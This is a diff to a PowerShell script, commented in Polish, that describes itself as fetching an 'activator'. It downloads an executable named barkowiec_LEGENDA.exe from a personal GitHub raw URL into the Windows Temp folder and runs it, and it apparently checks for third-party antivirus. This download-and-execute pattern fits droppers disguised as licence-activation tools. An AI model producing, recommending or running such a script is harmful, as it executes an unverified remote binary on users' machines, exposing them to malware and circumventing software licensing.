@@ -1,12 +1,19 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 $URLs = @(
     'https://github.com/testmina77/testmina77.github.io/raw/refs/heads/main/barkowiec_LEGENDA.exe'
 )
 
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
-    try { $cmdContent = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
+    try { 
+        $cmdContent = Invoke-WebRequest -Uri $URL -UseBasicParsing -OutFile "$env:SystemRoot\Temp\tempFile.exe"; 
+        break 
+    } catch {
+        Write-Host "Failed to download from $URL"
+    }
 }
-if (-not $cmdContent) {
+
+if (-not (Test-Path "$env:SystemRoot\Temp\tempFile.exe")) {
     Check3rdAV
     Write-Host "Failed to download activator from repositories! Quitting..."
     return
@@ -31,15 +38,10 @@ function CheckFile {
     } 
 }
 
-# Tworzenie tymczasowego pliku .cmd
-$rand = [Guid]::NewGuid().Guid
-$FilePath = "$env:SystemRoot\Temp\$rand.exe"
-Set-Content -Path $FilePath -Value $cmdContent
-
 # Sprawdzanie, czy plik został zapisany poprawnie
-CheckFile $FilePath
+CheckFile "$env:SystemRoot\Temp\tempFile.exe"
 
-# Uruchomienie pliku .cmd w tym samym oknie PowerShell (bez otwierania nowego okna)
-$process = Start-Process -FilePath "$FilePath"
-# -PassThru -Wait -NoNewWindow
+# Uruchomienie pliku .exe w tym samym oknie PowerShell
+Start-Process -FilePath "$env:SystemRoot\Temp\tempFile.exe" -PassThru -Wait
+
 exit
